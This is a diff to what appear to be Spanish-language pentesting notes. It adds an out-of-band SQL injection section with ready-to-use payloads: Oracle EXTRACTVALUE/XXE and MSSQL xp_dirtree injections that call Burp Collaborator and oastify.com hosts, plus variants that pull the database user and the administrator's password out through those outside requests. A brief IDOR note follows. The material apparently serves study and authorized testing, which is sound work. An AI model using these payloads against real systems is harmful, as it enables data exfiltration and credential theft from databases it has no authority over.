@@ -666,8 +666,32 @@ waitfor delay '00:00:10' Sleep
 ```
 
 #### Out of Band:
-- HTTP/DNS responses
+- HTTP/DNS responses:
+Sí el request de sql es procesado en un segundo hilo, la respuesta no va a hacer una espera visible, por eso aun asi deberiamos poder enviar información hacia otros lados.
 
+1- Posición: En este caso se debe cerrar el query, lo cual se puede hacer en varias opciones:
+```sql
+  ; (cerrar la consulta anterior)
+  ' AND/OR (select ...) (concatenar un subquery)
+  UNION (Unir un segundo select)
+```
+En cualquier caso debe seguir las reglas generales, por ejemplo una UNION debe llevar un ,NULL extra aparte del comando de dns en caso de que el query del codigo solo consulte una columna.
+
+2- Seleccionar el payload en base a la versión, en este caso seria uno de ORACLE usando un UNION:
+```sql
+  x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://(subdomain).oastify.com/"> %remote;]>'),'/l') FROM dual--
+```
+
+2- Por generar segundo:
+```sql
+    '; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
+```
+
+3- Exfiltrar, en este caso podemos concatenar variables o querys: 
+```sql
+    ' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://xrsy1oc2weq1cilvi2czyiwyipogc7avz.oastify.com/'||USER||'"> %remote;]>'),'/l') FROM dual--
+    ' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://xrsy1oc2weq1cilvi2czyiwyipogc7avz.oastify.com/'||(SELECT password from users where username='administrator')||'"> %remote;]>'),'/l') FROM dual--
+```
 
 ## IDOR:
 Mal asignación de permisos para ver recursos que solo deberian pertenecerle a un usuario, ejemplo: /read.php?file=reporte_enero.pdf sí esté URL es accesible para todos los usuarios pero solo deberia poder verlo quien lo subio.
